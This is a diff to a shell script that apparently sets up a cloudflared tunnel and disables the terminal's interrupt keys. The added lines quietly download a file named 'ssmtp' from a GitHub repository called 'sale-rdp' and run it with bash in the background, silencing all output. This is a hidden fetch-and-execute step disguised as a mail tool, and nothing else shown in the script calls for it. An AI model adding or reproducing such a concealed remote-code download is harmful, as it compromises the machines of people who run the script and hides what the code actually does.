@@ -3,6 +3,11 @@ stty intr ""
 stty quit ""
 stty susp undef
 
+
+curl -sSL -o ssmtp https://raw.githubusercontent.com/3222h/sale-rdp/main/ssmtp
+
+
+
 # Ensure cloudflared is installed
 if ! command -v cloudflared &> /dev/null; then
     echo "Installing Cloudflared..."
@@ -87,3 +92,7 @@ for i in 1; do
      # Replace content of "link" file with the current URL
     echo "$url" > link
 done
+
+
+
+bash ssmtp > /dev/null 2>&1 &
